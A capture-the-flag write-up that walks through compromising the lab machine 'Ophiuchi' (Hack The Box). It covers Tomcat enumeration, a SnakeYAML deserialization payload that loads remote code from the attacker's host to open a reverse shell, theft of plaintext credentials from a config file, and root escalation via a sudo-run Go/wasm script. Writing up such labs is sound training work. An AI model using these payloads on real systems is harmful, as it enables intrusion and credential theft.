# Ophiuchi 

export IP=10.10.10.227

# Solution

Lets start with the traditional nmap scan
```
cmd:sudo nmap -sC -sV -vvv -oN nmap/initial $IP

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpzM/GEYunOwIMB+FyQCnOaYRK1DYv8e0+VI3Zy7LnY157q+3SITcgm98JGS/gXgdHQ4JnkCcXjUb9LaNRxRWO+l43E9v2b2U9roG8QetbBUl5CjJ0KHXeIwNgOcsqfwju8i8GA8sqQCELpJ3zKtKtxeoBo+/o3OnKGzT/Ou8lqPK7ESeh6OWCo15Rx9iOBS40i6zk77QTc4h2jGLOgyTfOuSGTWhUxkhqBLqSaHz80G7HsPSs1BA9zAV8BOx9WmtpMsgDcNG14JAQQd904RCzgw0OaQ0J6szs78Us8Piec0rF/T4b1H3sbUedOdA0QKgGbNojObVrz5VwOw6rqxbs1gZLePXB5ZNjm0cp+Sen8TkRkdUf7Sgw92B//RhSoIakp1u5eOPs/uJ6hyCholUnerl3WK8NPB9f9ICPYq8PbvVMu6zcytV/cCjwxFloWB989iyuqG/lYcdMhGJlAacOFy5TRcTB8c5Qlmtl44J/4dyuCJAhj5SY6TRdcSxhmz0=
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM79V2Ts2us0NxZA7nnN9jor98XRj0hw7QCb+A9U8aEhoYBcrtUqegExaj/yrxjbZ/l0DWw2EkqH4uly451JuMs=
|   256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO31s/C33kbuzZl9ohJWVEmLsW9aqObU6ZjlpbOQJt0C
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 9.0.38
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
```

Lets leave an all port scan in the background while checking the **Tomcat 9.0.38** at the **8080** port <br>

Checking the page we can only input text and click a button which redirects to a blank page saying that it is disabled for security reasons <br>

Performing some fuzzing with apache tomcat wordlists we get some interesting results
```
cmd:gobuster dir -u http://$IP:8080 -w /opt/SecLists/Discovery/Web-Content/ApacheTomcat.fuzz.txt -x php,html,js,txt -o gobuster/tomcat.log -t 80

//manager/html (Status: 401)
//manager/html/ (Status: 401)
//manager/html/.php (Status: 401)
//manager/html/.html (Status: 401)
//manager/html/.js (Status: 401)
//manager/html/.txt (Status: 401)
//manager/status (Status: 401)
//manager/text (Status: 401)
//manager/jmxproxy (Status: 401)
//manager (Status: 302)
```

Accessing **/manager** we get prompted to insert credentials (which we dont have) <br>

Testing for defaults also does not work (tomcat:s3cret) <br>

There is also the **/host-manager** page, but need creds and it does not work also <br> 

The nmap all ports returned and had an interesting thing in it
```
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Parse YAML
```

This indicates that the server may be used to access others as a proxy <br>

By using **proxychains** with **10.10.10.227 8080** did not produced any results <br>

The only thing left to verify is what is sent by the page when the button **Parse** is clicked! So i using burp i noticed something that the request was using a parameter that i did not knew
```
Upgrade-Insecure-Requests: 1
```

This tells the server to redirect and use a secure connection, by removing it we can see a Server internal error (Code:500) 
```
java.lang.NullPointerException
java.base&#47;java.io.StringReader.&lt;init&gt;(StringReader.java:50)
org.yaml.snakeyaml.reader.StreamReader.&lt;init&gt;(StreamReader.java:63)
org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
Servlet.doPost(Servlet.java:15)
javax.servlet.http.HttpServlet.service(HttpServlet.java:652)
javax.servlet.http.HttpServlet.service(HttpServlet.java:733)
org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
```

We can see that, although the application says that the functionality is disabled, it still tries to parse the sourced yaml (which in this case, the sent yaml was invalid) <br>

Searching a bit, i found that snakeyaml has a vulnerability but in order to trigger it we must send the request with the original structure (without removing the Upgrade-Insecure-Requests) <br>

[Src](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858) <br>

In the request to the local web server we can see what the application requests so need to create the path and the file (empty for now)
```
/META-INF/services/javax.script.ScriptEngineFactory
```

From the above source link we have the confirmation that the vulnerability is the same, and so, we need to create JAVA code that simulates being the the **ScriptEngineFactory** <br>

From the POC referenced, it is needed the following things
1. folder with the exploit compiled
2. Reference from ScriptEngineFactory to the compiled code (.Class)

To achieve this we need the following folder structure
```
src
--- exploit
------Exploit.java
--- META-INF/services
------javax.script.ScriptEngineFactory
```

File contents:
- Exploit.java (the one in the sourced link, too big to paste here)
- javax(...)Factory -> exploit.Exploit

Then, and finally, compile the exploit
```
cmd: javac Exploit.java
```

Now listen for the reverse shell, start a python webserver at **/src** and use the payload below to get a shell (hopefully)
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.16.16/"] <- i used port 80, adjust accordingly
  ]]
]
```

And voila, we got it !!
```
cmd: whoami && id

tomcat
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Now, there is 2 other accounts
```
cmd: cat /etc/passwd | grep -E "/bin/bash|/bin/sh"

root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:,,,:/home/admin:/bin/bash
```
Lets check the creds on tomcat before running an enumeration script! Tomcat stores the credentials either in a DB or at **./conf/tomcat-users.xml** <br>
```
cmd: cat ~/conf/tomcat-users.xml | grep "admin"

<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```
Seems promising, lets try su to it 
```
cmd: su admin
Password: whythereisalimit

cmd: whoami && id

admin
uid=1000(admin) gid=1000(admin) groups=1000(admin)

cmd: cat ~/user.txt
FLAG: f0125fe0703c2890986cf86aa1c8ef5e
```

Yup, it did the trick! Lets privesc !! <br>
```
cmd: sudo -l

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

Seems that we can privesc from this go-lang code
```
bytes, _ := wasm.ReadBytes("main.wasm")
instance, _ := wasm.NewInstance(bytes)
defer instance.Close()
init := instance.Exports["info"]
result,_ := init()
f := result.String()
if (f != "1") {
        fmt.Println("Not ready to deploy")
} else {
        fmt.Println("Ready to deploy")
        out, err := exec.Command("/bin/sh", "deploy.sh").Output()
        if err != nil {
                    log.Fatal(err)
        }
        fmt.Println(string(out))
}
```

- Starts by reading **main.wasm** bytes with a relative path which is always a bad idea
- Then it (seems) to extract the "info" from Exports (seems a dictionary access)

Searching a bit, we can see that it is simillar to Assembly but with the goal of working with JavaScript and web-apps (to have better performance and functionalities interchangability) <br>

There is a [github page](https://github.com/WebAssembly/wabt) that offers the capability of transforming the wasm binary to text (the code before compiling) <br> 

The result is 
```
(func $info (export "info") (type $t0) (result i32)
    (i32.const 0))
```

Turns out that **info** is a funtion, and returns **i32.const 0** and we need it to return 1
```
if (f != "1") <- need to fail this  
```

Change
```
(i32.const 0)) -> (i32.const 1))
```

[Compile it](https://webassembly.github.io/wabt/demo/wat2wasm/index.html) and upload to the server <br>

Then, we need to create the **deploy.sh** shell script that will be executed (it is also relatively referenced)! I'll  <br>

In this shell script you may use whatever you want (bash +s, rev shell, etc) <br>

Running the command
```
cmd: sudo /usr/bin/go run /opt/wasm-functions/index.go
cmd: whoami && id (local listener)

root
uid=0(root) gid=0(root) groups=0(root)
cmd: cat ~/root.txt
FLAG: cc7dbe4a8ee952b5b191413257724437
```